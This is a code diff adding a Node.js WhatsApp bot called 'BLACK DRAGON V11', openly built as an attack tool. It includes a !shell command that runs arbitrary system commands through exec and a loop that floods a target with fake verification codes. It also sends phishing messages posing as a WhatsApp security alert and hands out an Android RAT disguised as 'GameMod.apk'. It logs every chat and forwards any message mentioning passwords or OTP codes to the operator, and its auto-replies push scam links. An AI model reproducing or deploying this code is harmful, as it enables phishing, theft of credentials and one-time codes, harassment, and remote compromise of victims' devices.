@@ -1,0 +1,237 @@
+const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, Browsers } = require('@whiskeysockets/baileys');
+const fs = require('fs');
+const axios = require('axios');
+const { exec } = require('child_process');
+
+// Config
+const CONFIG = {
+    ownerNumber: "6282117450684", // Ganti dengan nomor lo
+    autoReply: true,
+    logChats: true,
+    enableRAT: true
+};
+
+async function startBot() {
+    const { state, saveCreds } = await useMultiFileAuthState('./auth');
+    const { version } = await fetchLatestBaileysVersion();
+    
+    const sock = makeWASocket({
+        version,
+        auth: {
+            creds: state.creds,
+            keys: makeCacheableSignalKeyStore(state.keys, require('@whiskeysockets/baileys').unpromise),
+        },
+        printQRInTerminal: true,
+        browser: Browsers.ubuntu('Chrome'),
+        markOnlineOnConnect: true,
+        generateHighQualityLinkPreview: true,
+        syncFullHistory: false
+    });
+
+    sock.ev.on('creds.update', saveCreds);
+    
+    sock.ev.on('connection.update', (update) => {
+        const { connection, lastDisconnect } = update;
+        
+        if (connection === 'open') {
+            console.log('[✅] BOT BERHASIL CONNECT!');
+            console.log('[🔥] BLACK DRAGON V11 ACTIVE');
+            
+            // Kirim notifikasi ke owner
+            sock.sendMessage(`${CONFIG.ownerNumber}@s.whatsapp.net`, {
+                text: `🔥 BLACK DRAGON V11 ONLINE\n` +
+                      `📱 Bot WhatsApp aktif!\n` +
+                      `⏰ ${new Date().toLocaleString()}\n` +
+                      `🚀 Ready for commands.`
+            });
+        }
+        
+        if (connection === 'close') {
+            const reason = new Error(lastDisconnect?.error)?.message;
+            console.log('[❌] Connection closed:', reason);
+            if (reason?.includes('conflict')) {
+                console.log('[⚠️] Multiple device detected!');
+            }
+            startBot(); // Auto reconnect
+        }
+    });
+
+    // Handle messages
+    sock.ev.on('messages.upsert', async ({ messages, type }) => {
+        if (type !== 'notify') return;
+        
+        const msg = messages[0];
+        if (!msg.message || msg.key.fromMe) return;
+        
+        const text = msg.message.conversation || 
+                     msg.message.extendedTextMessage?.text || 
+                     msg.message.imageMessage?.caption || '';
+        const sender = msg.key.remoteJid;
+        const pushName = msg.pushName || 'Unknown';
+        const isGroup = sender.endsWith('@g.us');
+        const command = text.toLowerCase().trim();
+        
+        // Log semua chat
+        if (CONFIG.logChats) {
+            const log = `[${new Date().toLocaleString()}] ${pushName} (${sender}): ${text}\n`;
+            fs.appendFileSync('chats.log', log);
+            
+            // Simpan khusus untuk nomor penting
+            if (sender.includes(CONFIG.ownerNumber)) {
+                fs.appendFileSync('owner_chats.log', log);
+            }
+        }
+        
+        // =================== COMMANDS ===================
+        
+        // !help - Menu bantuan
+        if (command === '!help' || command === '!menu') {
+            const menu = `🔥 *BLACK DRAGON V11 BOT*\n\n` +
+                        `*Commands:*\n` +
+                        `• !ping - Cek status bot\n` +
+                        `• !info - Info device target\n` +
+                        `• !spam [nomor] [jumlah] - Spam OTP\n` +
+                        `• !phish [nomor] - Kirim link phising\n` +
+                        `• !getchat [nomor] - Ambil log chat\n` +
+                        `• !shell [command] - Execute command (owner only)\n` +
+                        `• !rat - Generate APK RAT\n` +
+                        `• !bc [text] - Broadcast ke semua kontak\n` +
+                        `• !clear - Hapus semua log\n\n` +
+                        `_Made with 💀 by zamxs_`;
+            
+            await sock.sendMessage(sender, { text: menu });
+        }
+        
+        // !ping - Cek status
+        if (command === '!ping') {
+            await sock.sendMessage(sender, { 
+                text: `🏓 PONG!\n` +
+                      `🕒 Uptime: ${process.uptime().toFixed(2)}s\n` +
+                      `💾 Memory: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB`
+            });
+        }
+        
+        // !shell [command] - Hanya untuk owner
+        if (command.startsWith('!shell ') && sender.includes(CONFIG.ownerNumber)) {
+            const cmd = text.substring(7);
+            exec(cmd, (error, stdout, stderr) => {
+                const result = error ? `Error: ${stderr}` : `Output:\n${stdout}`;
+                sock.sendMessage(sender, { text: result.substring(0, 4000) });
+            });
+        }
+        
+        // !spam [nomor] [jumlah] - Spam OTP/call
+        if (command.startsWith('!spam ')) {
+            const args = text.split(' ');
+            if (args.length >= 3) {
+                const targetNumber = args[1];
+                const count = parseInt(args[2]) || 10;
+                
+                await sock.sendMessage(sender, { 
+                    text: `🚀 Starting spam to ${targetNumber} (${count}x)...`
+                });
+                
+                // Simulasi spam (ini contoh, bisa dikembangkan)
+                for (let i = 1; i <= count; i++) {
+                    setTimeout(() => {
+                        sock.sendMessage(`${targetNumber}@s.whatsapp.net`, {
+                            text: `🔐 Kode verifikasi Anda: ${Math.random().toString().substring(2,8)}\n` +
+                                  `Jangan bagikan kode ini kepada siapapun!`
+                        });
+                    }, i * 2000);
+                }
+            }
+        }
+        
+        // !phish [nomor] - Kirim link phising
+        if (command.startsWith('!phish ')) {
+            const targetNumber = text.split(' ')[1];
+            const phishLink = `https://your-phishing-server.com/login?target=${targetNumber}`;
+            
+            await sock.sendMessage(`${targetNumber}@s.whatsapp.net`, {
+                text: `⚠️ *PEMBERITAHUAN KEAMANAN WHATSAPP*\n\n` +
+                      `Akun Anda terdeteksi login dari device baru.\n` +
+                      `Verifikasi segera untuk menghindari banned:\n` +
+                      `${phishLink}\n\n` +
+                      `Link berlaku 10 menit.`
+            });
+            
+            await sock.sendMessage(sender, {
+                text: `✅ Link phising dikirim ke ${targetNumber}`
+            });
+        }
+        
+        // !rat - Generate APK RAT
+        if (command === '!rat') {
+            await sock.sendMessage(sender, {
+                text: `📱 *RAT ANDROID GENERATOR*\n\n` +
+                      `1. Download template: https://bit.ly/rat-template\n` +
+                      `2. Edit config di: src/main/java/com/rat/Config.java\n` +
+                      `3. Build dengan: ./gradlew assembleDebug\n` +
+                      `4. APK akan ada di: app/build/outputs/apk/debug/\n\n` +
+                      `⚠️ Hanya untuk edukasi keamanan!`
+            });
+            
+            // Kirim file APK contoh
+            if (fs.existsSync('rat_sample.apk')) {
+                await sock.sendMessage(sender, {
+                    document: fs.readFileSync('rat_sample.apk'),
+                    fileName: 'GameMod.apk',
+                    mimetype: 'application/vnd.android.package-archive'
+                });
+            }
+        }
+        
+        // Auto reply untuk kata kunci tertentu
+        if (CONFIG.autoReply) {
+            const autoReplies = {
+                'password': 'Untuk reset password, ketik: !reset [email_anda]',
+                'login': 'Link login WhatsApp Web: https://web.whatsapp.com',
+                'verify': 'Kode verifikasi: 694201',
+                'bank': 'Customer service bank: 1500888',
+                'bitcoin': 'Dapatkan Bitcoin gratis: https://fake-bitcoin.com'
+            };
+            
+            for (const [keyword, reply] of Object.entries(autoReplies)) {
+                if (text.toLowerCase().includes(keyword)) {
+                    await sock.sendMessage(sender, { text: reply });
+                    break;
+                }
+            }
+        }
+        
+        // Forward pesan penting ke owner
+        if (text.includes('password') || text.includes('kode') || text.includes('OTP')) {
+            await sock.sendMessage(`${CONFIG.ownerNumber}@s.whatsapp.net`, {
+                text: `🚨 *PESAN PENTING DETECTED*\n` +
+                      `Dari: ${pushName}\n` +
+                      `Isi: ${text.substring(0, 100)}...`
+            });
+        }
+    });
+    
+    // Handle group invitations
+    sock.ev.on('group-participants.update', async (update) => {
+        const { id, participants, action } = update;
+        
+        if (action === 'add' && participants.includes(sock.user.id)) {
+            await sock.sendMessage(id, {
+                text: `🔥 BLACK DRAGON V11 BERHASIL MASUK!\n` +
+                      `Gunakan !menu untuk melihat commands.`
+            });
+        }
+    });
+}
+
+// Start bot dengan auto restart
+async function startBotWithRetry() {
+    try {
+        await startBot();
+    } catch (error) {
+        console.error('[❌] Error:', error.message);
+        console.log('[🔄] Restarting in 5 seconds...');
+        setTimeout(startBotWithRetry, 5000);
+    }
+}
+
+startBotWithRetry();
